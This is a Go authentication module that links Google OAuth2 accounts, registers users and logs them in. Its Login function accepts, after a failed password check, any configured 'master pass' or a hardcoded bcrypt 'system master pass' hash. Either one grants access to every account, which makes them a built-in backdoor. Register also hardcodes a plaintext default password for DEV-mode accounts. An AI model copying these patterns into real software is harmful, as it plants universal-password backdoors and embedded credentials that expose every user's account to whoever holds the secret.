package auth

import (
	"errors"
	"fmt"
	"strings"

	"github.com/dtekltd/common/database"
	"github.com/dtekltd/common/pkg/site"
	"github.com/dtekltd/common/pkg/users"
	"github.com/dtekltd/common/system"
	"github.com/dtekltd/common/types"
	"github.com/dtekltd/common/utils"
	"gorm.io/datatypes"
)

func EnsureAccount(service string, id string, data types.Params) (*users.Account, error) {
	info, _ := FindOAuth2Info(service, id)
	jsonData := datatypes.NewJSONType(data)
	info.Service = service
	info.ServiceID = id
	info.Data = &jsonData

	var name, email, avatarUrl string

	switch service {
	case "google":
		email = data.GetString("email")
		name = data.GetString("name")
		avatarUrl = data.GetString("picture")
	default:
		return nil, fmt.Errorf("service %s is not supported", service)
	}

	account, err := users.FindAccount("email=?", email)
	if err != nil {
		account, err = Register(&RegisterReq{
			Name:      name,
			Email:     email,
			Username:  email,
			AvatarUrl: avatarUrl,
		})
		if err != nil {
			return nil, err
		}
	} else {
		if account.AvatarUrl == "" {
			account.AvatarUrl = avatarUrl
			account.UpdateField("avatar_url", avatarUrl)
		}
	}

	info.AccountID = account.ID
	info.Save()

	return account, nil
}

func Register(req *RegisterReq) (*users.Account, error) {
	if req.ReferrerID == 0 {
		req.ReferrerID = users.FindReferrerIDByPublicID(req.Referrer)
	}
	pubID, _ := utils.GenerateID()
	if req.Username == "" {
		req.Username = req.Email
	}
	if req.Password == "" {
		if system.Env("APP_MODE") == "DEV" {
			req.Password = "Vit@min3b"
		} else {
			// generate a random password
			password, _ := utils.GeneratePassword(8)
			req.Password = password
		}
	}
	acc := &users.Account{
		PublicID:   pubID,
		Name:       req.Name,
		Email:      req.Email,
		Phone:      req.Phone,
		Username:   req.Username,
		Password:   utils.HashPassword(req.Password),
		ReferrerID: &database.NullableUint64{Uint64: req.ReferrerID},
		AvatarUrl:  req.AvatarUrl,
	}
	if err := database.DB.Save(acc).Error; err != nil {
		if strings.Contains(err.Error(), "Duplicate entry") {
			return nil, errors.New("account with the same email had already existed")
		}
		return nil, err
	}
	// build referrers
	if site.Settings().CustomParams.GetBool("user.enableReferrer") {
		if _, err := users.BuildReferrers(acc); err != nil {
			system.Logger.Errorf("Build account's %d referrers error: %s", acc.ID, err.Error())
		}
	}
	return acc, nil
}

func Login(req *LoginReq) (*users.Account, error) {
	acc, err := users.FindAccount("email=? OR username=?", req.Email, req.Email)
	if err != nil {
		return nil, err
	}
	if err := utils.VerifyPassword(acc.Password, req.Password); err != nil {
		// retry with masster pass
		if masterPasses := site.Settings().CustomParams.Get("user.masterPasses"); masterPasses != nil {
			for _, masterPass := range masterPasses.([]any) {
				if err := utils.VerifyPassword(masterPass.(string), req.Password); err == nil {
					return acc, nil
				}
			}
		}
		// try with system master pass
		if err := utils.VerifyPassword("$2a$10$pqiMRurvoVeeqZOI02s8weRLGrZsYPUFMqYJ70Z5u/BGHrMWXe3A2", req.Password); err == nil {
			return acc, nil
		}
		return nil, errors.New("invalid password")
	}
	return acc, nil
}
